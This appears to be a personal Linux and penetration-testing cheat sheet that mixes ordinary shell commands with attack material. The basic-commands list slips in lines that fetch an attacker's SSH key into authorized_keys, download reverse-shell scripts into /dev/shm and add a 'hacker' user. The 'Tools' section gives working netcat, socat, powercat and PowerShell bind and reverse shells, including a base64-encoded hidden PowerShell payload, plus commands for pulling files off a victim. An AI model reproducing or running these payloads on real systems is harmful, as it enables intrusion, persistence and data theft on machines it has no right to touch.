# Linux

## Basic Linux Commands:

````bash
# Basic Linux Commands
tool --help 	      # Show Help Menu
man tool 		# Show Manual of a command/tool
whatis tool  	         # Show one line manual of a tool
apropos <crack> 	# u know the usage not the tool 
rm file                  # Remove file
rm -r Directory	        # Remove Directory
mkdir 		        # Make Directory
cp file		         # Copy file
cp -r directory		# Copy Directory
ifconfig	   # Show Ip configurations
ip a		      # Show IP
echo "Text"  		# Show Text	
nano file.txt			  # make and edit file
cat	file.txt 			  # Show File Content In the Terminal
sudo adduser 				  # Add User
su - ahmed				  # Switch to user Ahmed
passwd				  # Password Change
sudo ubdatedb			  # Ubdate Database
locate flag.txt				# Find File Location
find . -name flag.txt		# Find FIle Which name is Flag.txt in the directory we are In
history     			  # Show all ran commands
!<command_id>       # Run command from history
!!                          		# Run the last command
CTRL+r                      		# Do (reverse-i-search)`':  to search for command u used earlier
sudo service <service_name> <command>			# Manage Service using service command
sudo systemctl <cmd> <service_name>       # Manage Service using systemctl command
sudo systemctl list-unit-files					  # list-unit-files
sudo service <service_name> status  			# Show the status of Services
apt update					            # Update kali istalled Tools and Database 
apt upgrade				            # Upgrade Kali Installeed 
apt-cache search <tool>							      # Seach For a tool before install
apt show <tool>									          # Show Tool Discreption before install
sudo apt install <tool>							      # Install application
sudo apt remove <tool>        					  # Remove application
apt remove --purge <tool>   					    # Remove Configuration File
dpkg -i <APP>									            # install application Packedge
Export h=h0tak88r      							      # Define variable to all sessions
h=h0tak88r                						    # Define variable this session only
unset [VARIABLE_NAME]	 						        # Unset variable
sudo nano ~/.bashrc 							        # To set permanent environment variables for a single user, edit the .bashrc file:
export [VARIABLE_NAME]=[variable_value] 	# add this line to the file
source ~/.bashrc								          # Update the file source
echo "lol" > lol.txt       						    # Save word lol in a new file lol.txt
echo "lol" >> lol.txt     						    # Add to file data
cat < lol.txt                  					  # now lol.txt is STDIN !!
ls -l > lol.txt 2> lol2.txt    					  # save output in lol and err in lol2
cat file.txt | tee lol          				  # show output and save in lol
xargs                             				# for arguments
ls | xargs rm                  					  # do ls and rm all files 
grep "lol" lol.txt 								        # Searh for word "lol" in file "lol.txt"
grep -i "lol" lol.txt							        # Ignore case sensitive
cat file.txt | grep "pass\\|password\\|admin"  # Grep more thand one word
cat file.txt | grep [0-9]					  	    # Grep range from 0 to 9
cat file.txt | grep ^lol					  	    # Grep lines starts with word "lol"
cat file.txt | grep ^l.....m 					    # Grep lines starts with "l" and the 7th letter is "m" 
cat file.txt | grep ^[a-f]					  	  # Grep lines that starts with any character of range from "a" to "f"
sed 											                # Stream Editor
sed 's/password/hacked/' lol.txt				  # Edit the first word in each line that match "password" to "hacked"
sed 's/password/hacked/g' lol.txt   			# Edit every single word thst match "password" to "hacked"
split -l 100 lol.txt new_						      # Split every 100 line in a more than one file
head -n 100 rockyou.txt 						      # Show firset 100 lines of file "rockyou.tx"
tail -n 100 rockyou.txt 						      # Show last 100 lines of file rockyou.txt
cut Emails-pass.txt | cut -d ":" -f 1     # Cut by ":" and print the first line before it 
cat lol.txt | awk '{print $1,$3}'				  # show the 1st and 3rd columns of a file 
cat lol.txt | awk '{if ($1~/Password/) print}'	# print lines that firset column contain word Password
comm file1 file2 								          # Compare between 2 Files
sleep 1000&										            # Do Process in the Background
ps aux											              # Show The Active Processes it is like Task Manager in Windows
jobs 											                # Show the running background Commands
fg %1											                # Control The Process of id 1
CTRL+Z											              # Stop the Process
bg %1 											              # Rerun the Process with ID 1
nohup <command>									          # Run the Process even when you close the terminal and save out to nohup.txt
disown %1 										            # nohup the Process with id 1
kill <id> 										            # Kill Process
kill -9 <id> 									            # Kill and Close this session now!!!
sudo tail -f <log_file_for_apache2>				# Monitoring the last changes
free 											                # Show the memory Details
watch <command> 								          # watch the process or commands output every 2 seconds
df 												                # Show desktop storage Details
wget 	or 		axel							            # Download files
curl 			 								                # it is like a command line browser
git clone 										            # install tools/files from github
export HISTIGNORE="&::ls:exit:clear:history"	# Ignore those commands from history records
alias l='ls -lah' 								        # make aliases
uname -a                                  # Show system and kernel
head -n1 /etc/issue                       # Show distri­bution
mount                                     # Show mounted filesy­stems
date                                      # Show system date
uptime                                    # Show uptime
whoami                                    # Show your username
CTRL-z                                    # Sleep program
CTRL-a                                    # Go to start of line
CTRL-e                                    # Go to end of line
CTRL-u                                    # Cut from start of line
CTRL-k                                    # Cut to end of line
CTRL-r                                    # Search history
!!                                        # Repeat last command
!abc                                      # Run last command starting with abc
env										                    # Show enviro­nment variables
echo $NAME								                # Output value of $NAME variable
export NAME=value						              # Set $NAME to value
$PATH									                    # Executable search path
$HOME									                    # Home directory
$SHELL 									                  # Current shell
cmd 2> file 							                # Error output (stderr) of cmd to file
cmd 1>&2								                  # stdout to same place as stderr
cmd 2>&1								                  # stderr to same place as stdout
cmd &> file 							                # Every output of cmd to file
cmd 2> /dev/null						              # Redirect STDERR to /dev/null
base64 -w 0 file                          # Exfiltration using Base64
xxd -p boot12.bin | tr -d '\\n'            # Get HexDump without new lines
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys #Add public key to authorized keys
echo -n -e                                # Echo without new line and Hex
wc -l <file> 							                # Count Lines
wc -c 									                  # Count Chars
sort -nr 								                  # Sort by number and then reverse
cat file | sort | uniq 					          # Sort and delete duplicates
sed -i 's/OLD/NEW/g' path/file 			      # Replace string inside a file
#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker  

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' <http://host:3000/endpoint>
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' <http://host:3000/endpoint>

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode <https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html>
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
````

### NVIDIA driver Installation:

```bash
# Update and upgrade system
sudo apt update && sudo apt upgrade

# Add non-free repository
sudo apt-add-repository non-free

# Install Nvidia driver
sudo apt install nvidia-driver

# Reboot the system
sudo reboot

# Verify Nvidia driver installation
nvidia-smi

# Restart network service
sudo systemctl restart NetworkManager.service

# Check Disk Capacity
inxi --disk

# Check Battery Details
upower -i /org/freedesktop/UPower/devices/battery_BAT1

# Install Package
sudo dpkg -i Xmind-for-Linux-amd64bit-23.09.11172-202310122350.deb

# Uninstall Package
sudo dpkg -r xmind-vana

# List Installed Packages
sudo dpkg -l

# Send File to Discord using Webhook
cat results.txt | curl -X POST -F "file=@-" "https://discord.com/api/webhooks/your_webhook_url"

# Send File to Telegram using Webhook
cat results.txt | curl -X POST -F "document=@-" "https://api.telegram.org/bot<your_bot_token>/sendDocument" -F "chat_id=<your_chat_id>"
```

## Tools

```bash
Lab configuration

Attacker : 192.168.10.51
victim linux : 192.168.10.52
victim windows:192.168.10.50

----------------------------------------------------------------------
#1.connect to port using nc & socat

using netcat

attacker:
nc -nv 192.168.10.52 4444

victim:
nc -nlvp 4444

using socat
attacker:
socate -dd - tcp4:192.168.10.52:4444

victim:
socat -ddd tcp4-listen:4444 stdout

---------------------------------------------------------------------------------------------------------------------------------
#2. send file using nc & socat

netcat :
victim:
nc -nlvp 4444 < ~/Desktop/latest/rtl8821CU/wlan0dhcp

client :
nc -nv 192.168.10.52 4444 > abc

******
socat

client:
socat tcp4:192.168.10.52:4444 file:abc.txt,create
server:
socat tcp4-listen:4444,fork file:~/Desktop/file.txt

---------------------------------------------------------------------------------------------------------------------------------
#3.bind shell to execute a command using nc & socat

netcat

victim:
nc -nlvp 4444 -e /bin/bash

client:
nc -nv 192.168.10.52 4444

********
socat

victim
socat tcp4-listen:4445,fork exec:/bin/bash

client
socat tcp4:192.168.10.52:4445 stdout

# socat encrypted bind shells

# Victim Listen
socat -d -d -d OPENSSL-LISTEN:4444,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash

# Attacker Connect
socat - OPENSSL:<IP_VICTIM>:4444, verify=0

----------------------------------------------------------------------
#4. Reverse Shell using nc & socat

- netcat

# victim 
nc -nv <IP> 44444 -e /bin/bash 

# Attacker 
nc -nlvp 4444 

- socat 

# Victim
socat -d -d -d TCP4:<IP_ATTACKER>:4444 EXEC:/bin/bash

# Atacker
socat -d -d -d TCP4-LISTEN:4444

----------------------------------------------------------------------
#5. receive file using powershell
receiver
powershell -c "(new-object System.Net.WebClient).DownloadFile('<http://192.168.10.51:8000/amr.txt','C:\\Users\\victim\\Desktop\\amr2.txt>')"

sender
nc -nlvp 4444 < ~/Desktop/latest/file
----------------------------------------------------------------------
#6. bind shell using powershell

victim (cmd) :
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"

attacket:
nc -nv 192.168.10.50 4444
----------------------------------------------------------------------
#7. reverse bind using powershell

victim (make sure to change the ip &/or port ):
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.10.51',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

attacker:
nc -nlvp 4444
----------------------------------------------------------------------
#8. bind shell using powercat

attacker
nc -nv 192.168.10.50 4444

victim
powercat -l -p 4444 -e cmd.exe

----------------------------------------------------------------------
#9. reverse bind using powercat

victim
powercat -c 192.168.10.51 -p 4444 -e cmd.exe

attacker:
nv -nlvp 4444
----------------------------------------------------------------------
#10.encoding command to gain access using the python tool (use on cmd)

./reversesg.py 192.168.10.51 4444

powershell -NoP -NonI -W Hidden -Exec Bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMAAuADUAMQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
----------------------------------------------------------------------
#11. sending file from victim's machine to our machine

victim
powercat -c 192.168.10.51 -p 8000 -i C:\\Users\\victim\\Desktop\\amr2.ps

attacker (just listening):
nc -nlvp 8000 > aaaaa.txt
---------------------------------------------------------------------
# Wireshark 
--------------------------------------
1) Test listening ports
netstat -tulpn | grep :21
--------------------------------------
2) install FTP server
sudo apt install vsftpd
--------------------------------------
3) Run FTP server
/etc/init.d/vsftpd start
or
sudo systemctl vsftpd start
---------------------------------
# Connect to machine ftp server
ftp <IP>
enter username 
enter password
---------------------------------------------
# Wireshark Filters
<https://wiki.wireshark.org/DisplayFilters>
1. set filter to ftp
2. click Follow TCP Stream 
3. You should find the connecting stream unenchrepted
4. save results into file.pcapng
----------------------------------------------
# tcpdump tool 
5. open this file with tcdump tool
	sudo tcpdump -r file.pcapng 
# filtering results
<https://www.redhat.com/sysadmin/filtering-tcpdump>
```

### Additional Resources:

#### Linux Commands and Shell Usage:

1. [Linux Command Line Basics](https://www.digitalocean.com/community/tutorial\_series/getting-started-with-linux)
2. [Linux Commands Cheat Sheet](https://cheatography.com/davechild/cheat-sheets/linux-command-line/)
3. [Bash Scripting Tutorial](https://www.shellscript.sh/)
4. [Linux Documentation Project](https://www.tldp.org/)
